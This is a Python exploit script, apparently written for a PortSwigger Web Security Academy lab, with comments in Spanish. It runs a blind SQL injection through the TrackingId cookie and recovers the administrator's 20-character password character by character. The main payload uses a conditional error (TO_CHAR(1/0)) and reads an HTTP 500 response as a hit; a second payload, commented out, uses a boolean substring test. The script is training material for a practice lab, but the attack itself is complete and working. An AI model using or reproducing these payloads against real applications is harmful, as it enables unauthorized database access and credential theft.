#!/usr/bin/python3
from pwn import *
import requests,signal ,time,pdb,sys,string

def def_handler(sig,frame):
   print("\n\n [!] Saliendo... \n")
   sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT,def_handler)

main_url = "https://0a7b0003031a897d821d584700da0099.web-security-academy.net/filter?category=Pets"

characters = string.ascii_lowercase + string.digits + string.ascii_uppercase  # caracteres lower case  + upper cas + numeros

def make_requests():
   password = ""

   p1 = log.progress("Fuerza bruta") # nombre la barra de progreso
   p1.status("iniciando Ataque de fuerza bruta")

   p2 = log.progress("password") # nombre de la 2 barra de progreso

   for posicion in range(1,21): #tamaño de la contraseña es 20 longitud
      for character in characters:
         #COOKIES VULNERABLES A SQL INJECTION
         cookies = {
         #'TrackingId' : "aI7htw8h5K5p9nsH'  and (select substring(password,%d,1) from users  where username='administrator')='%s" % (posicion,character),
         'TrackingId' : "eo2xoI5AgMd0hAuZ'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' THEN TO_CHAR(1/0) ELSE NULL END FROM users where  username='administrator') -- -" % (posicion,character),
         'session': 'xDpaeLgKAz0vkTMsSDeqTvj0wFINKQ7E'
         }

         #p1.status(cookies['TrackingId']) # resultado de la barra de progreso

         r = requests.get(main_url,cookies=cookies) # respuesta de la peticion se almacena en r

         #si en la respuesta es presente la palabra que es el que indica si fue existoso o no 
         #!!! IMPORTANTE !!! TIENEN OTROS METODOS COMO : r.status_code , r.headers , r.cookies , r.text , r.json() , r.url
         #print(r.status_code , "status code is" , type(r.status_code))
         if r.status_code == 500:           
            password += character
            p2.status(password) # resultado de la 2 barra  de progreso
            break
         
if __name__ == '__main__':
   make_requests()
